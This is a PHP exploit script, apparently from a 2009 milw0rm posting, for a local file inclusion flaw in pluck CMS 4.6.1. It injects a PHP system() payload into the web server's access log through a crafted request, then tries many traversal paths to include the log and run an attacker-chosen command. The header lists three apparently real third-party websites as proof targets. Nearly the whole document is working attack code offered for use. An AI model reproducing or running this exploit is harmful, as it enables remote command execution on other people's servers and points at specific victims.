<?php 

/*
 pluck v 4.6.1 LFI exploit
 autor : Alfons Luja
 Vuln is in \data\modules\blog\module_pages_site.php 

  ...

      $includepage = 'blog_include.php';
      //Only set 'view post'-page if a post has been specified
      if (isset($_GET['post'])) {
	//Check if post exists, and include information
	   if (file_exists('data/settings/modules/blog/posts/'.$_GET['post'])) {
		include('data/settings/modules/blog/posts/'.$_GET['post']);
		$module_page['viewpost'] = $post_title;
	   }
      }
 ...

 Nothing to comment ;x
 Greetings: For all friends and obvious for me ;D

 pr00f: 
 http://www.kilgarvangaa.com//data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
 http://www.southtrewlogcabins.co.uk/data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
 http://www.seanhood.co.uk/data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
*/  
 

if($argc < 4) die("Use host path command [www.penatgon.gov /pluck ls l]\n");

set_time_limit(0);
error_reporting(0);

$host = $argv[1];
$port = $argv[2];
$path = $argv[3];
$command = $argv[4];

//add something if not w00rking ;x

$shell = array(  
         "<?php echo(' e[Ho_trip ');system('$command');echo(' d34th_trip'); ?>",
         "../apache/logs/access.log",
         "../../apache/logs/access.log",
         "../../../apache/logs/access.log",
         "../../../../apache/logs/access.log",
         "../../../../../apache/logs/access.log",
         "../../../../../../apache/logs/access.log",
         "../../../../../../../apache/logs/access.log",
         "../../../../../../../../apache/logs/access.log",
         "../../../../../../../../../apache/logs/access.log",
         "../../../../../../../../../../apache/logs/access.log",
         "../../../../../../../../../../../apache/logs/access.log",
         "../var/log/httpd/access.log",
         "../../var/log/httpd/access.log",
         "../../../var/log/httpd/access.log",
         "../../../../var/log/httpd/access.log",
         "../../../../../var/log/httpd/access.log",
         "../../../../../../var/log/httpd/access.log",
         "../../../../../../../var/log/httpd/access.log",
         "../../../../../../../../var/log/httpd/access.log",
         "../../../../../../../../../var/log/httpd/access.log",
         "../../../../../../../../../../var/log/httpd/access.log",
         "../../../../../../../../../../../var/log/httpd/access.log",
         "../var/log/apache/access.log",
         "../../var/log/apache/access.log",
         "../../../var/log/apache/access.log",
         "../../../../var/log/apache/access.log",
         "../../../../../var/log/apache/access.log",
         "../../../../../../var/log/apache/access.log",
         "../../../../../../../var/log/apache/access.log",
         "../../../../../../../../var/log/apache/access.log",
         "../../../../../../../../../var/log/apache/access.log",
         "../../../../../../../../../../var/log/apache/access.log",
         "../../../../../../../../../../../var/log/apache/access.log",
         "../usr/local/apache2/logs/access.log",
         "../../usr/local/apache2/logs/access.log",
         "../../../usr/local/apache2/logs/access.log",
         "../../../../usr/local/apache2/logs/access.log",
         "../../../../../usr/local/apache2/logs/access.log",
         "../../../../../../usr/local/apache2/logs/access.log",
         "../../../../../../../usr/local/apache2/logs/access.log",
         "../../../../../../../../usr/local/apache2/logs/access.log",
         "../../../../../../../../../usr/local/apache2/logs/access.log",
         "../../../../../../../../../../usr/local/apache2/logs/access.log",
         "../../../../../../../../../../../usr/local/apache2/logs/access.log", 
   );
function _hdr($int){   //MiaÂ³o nie byÃ¦ file_get_contents
       
        global $shell,$host,$path;
        $header .= "GET /$host/$path/$shell[$int]  HTTP/1.1\r\n";
        $header .= "Host: $host\r\n";
        $header .= "User-Agent: _echo [ru] (Win6.66; @)\r\n";
        $header .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $header .= "Accept-Language: en-us,en;q=0.5\r\n";
        $header .= "Accept-Encoding: gzip,deflate\r\n";
        $header .= "Connection: close\r\n\r\n";
        return $header;


}


function _inject($hosts,$ports){
    
           $hnd = fsockopen($hosts,$ports,$errno, $errstr, 30);
           if(!$hnd) die("Injection errr $errstr\n");
           fwrite($hnd,_hdr(0));
           fclose($hnd);  


}

function _result($data){
 
          $ret = explode(' e[Ho_trip ',$data); 
            if($ret[1] != ""){
              for($i = 1;$i<count($ret);$i++){
               $ret_2 = explode(' d34th_trip',$ret[$i]);  
                   if($i - count($ret) == -1){
                     if($ret_2[0] != ""){
                        echo($ret_2[0]);
                     } else {
                        die("Exploit failed!!\n");
                     }
               } 
              }    
               
            }

}

function _exploit($hosts,$paths){

        global $shell;
        $rets = "";
        $count = count($shell);

        for($i=1;$i<$count;$i++){
            
            $tab = file_get_contents("http://".$hosts."/".$paths."/data/modules/blog/module_pages_site.php?post=$shell[$i]");
           _result($tab);
  
        }
 
         
}
echo("---- pluck v 4.6.1 -----\n\n".
     "Autor: Alfons Luja\n".
     "Target: $host\n".
     "Path: $path\n".
     "Port: $port\n".
     "COM: $command\n".
     "Ex: poc.php www.target.com 80 pluck \"dir\"\n\n");

    _inject($host,$port);
    _exploit($host,$path);

?>

# milw0rm.com [2009-03-23]
